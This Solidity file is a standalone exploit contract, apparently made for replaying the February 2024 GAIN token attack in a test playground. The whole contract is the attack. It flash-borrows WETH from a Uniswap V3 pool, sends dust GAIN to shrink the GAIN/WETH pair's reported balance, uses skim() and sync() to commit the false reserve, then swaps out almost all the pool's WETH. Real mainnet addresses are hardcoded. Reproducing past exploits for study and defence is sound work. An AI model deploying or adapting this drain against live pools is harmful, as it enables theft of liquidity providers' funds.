// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-02-GAIN).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this), and the Uniswap V3 flash callback `uniswapV3FlashCallback`
// lives on the test itself), so there is no standalone contract to deploy. This
// contract is a faithful, self-contained copy of that inline attack (testExploit +
// uniswapV3FlashCallback + exploitGAIN) so the playground can deploy it and record
// run(). Logic and constants are copied verbatim from test/GAIN_exp.sol.
//
// Root cause: GAIN's balanceOf() reports a smaller amount once an address is
// assigned to "SideA"/"SideB" (a divisor that tracks a much smaller counter than
// the rebased total supply). Sending the GAIN/WETH pair a dust amount of GAIN
// silently assigns it a side and shrinks its *reported* balance without any GAIN
// actually leaving the pool. The pair's permissionless skim()+sync() then commits
// that fake, smaller balance as the pool's new GAIN reserve, collapsing the
// constant-product invariant and letting the attacker swap out almost the entire
// WETH reserve for a trivial amount of GAIN.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniPairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
}

contract GainDrain {
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant GAIN = 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac;
    address constant UNIV3_USDT_WETH = 0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b;
    address constant UNIV2_GAIN_WETH = 0x31d80EA33271891986D873B397d849A92EF49255;

    uint256 constant TOTAL_BORROWED = 0.1 ether;

    IERC20 private constant weth = IERC20(WETH);
    IERC20 private constant gain = IERC20(GAIN);
    IUniPairV3 private constant univ3USDT = IUniPairV3(UNIV3_USDT_WETH);
    IUniPairV2 private constant univ2GAIN = IUniPairV2(UNIV2_GAIN_WETH);

    // step 0: flash-borrow 0.1 WETH from the Uniswap V3 USDT/WETH pool; the callback does the drain.
    function run() external {
        bytes memory userData = "";
        univ3USDT.flash(address(this), TOTAL_BORROWED, 0, userData);
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256, bytes memory) external {
        require(msg.sender == UNIV3_USDT_WETH, "only flash pool");

        // step 1: move the borrowed WETH into the GAIN/WETH pair, then run the exploit.
        weth.transfer(UNIV2_GAIN_WETH, TOTAL_BORROWED);
        exploitGAIN();

        // step 2: repay the flash loan (principal + fee).
        weth.transfer(UNIV3_USDT_WETH, TOTAL_BORROWED + fee0);
    }

    function exploitGAIN() internal {
        // 1a. Trigger a tiny swap so the pair's GAIN reserve is nonzero to work with.
        uint256 amount = 100_000;
        univ2GAIN.swap(0, amount, address(this), "");

        // 1b. Send the pair dust GAIN — this is the exploit: it silently assigns the
        //     pair to SideA/SideB, which changes the DIVISOR used by balanceOf(pair)
        //     without the pair's underlying gons actually changing.
        gain.transfer(UNIV2_GAIN_WETH, 100);
        // 1c. skim()+sync() are permissionless and commit the now-shrunk
        //     balanceOf(pair) as the pool's real GAIN reserve.
        univ2GAIN.skim(address(this));
        univ2GAIN.sync();

        // 2. Repeat with a slightly larger dust transfer to compound the reserve skew.
        gain.transfer(UNIV2_GAIN_WETH, 188);
        univ2GAIN.skim(address(this));
        univ2GAIN.sync();

        // 3. Send a much larger GAIN amount, further collapsing the reported reserve.
        gain.transfer(UNIV2_GAIN_WETH, 130_000_000_000_000);

        // 4. Compute how much WETH to pull out, leaving 1% behind (mirrors the
        //    original PoC's `leave_dust` calculation — note the original subtracts
        //    the SAME balance from itself before dividing, matching the test byte for byte).
        uint256 leaveDust = weth.balanceOf(UNIV2_GAIN_WETH) - weth.balanceOf(UNIV2_GAIN_WETH) / 100;

        // 5. Swap out the collapsed WETH reserve for a trivial amount of GAIN.
        univ2GAIN.swap(leaveDust, 0, address(this), "");
    }
}
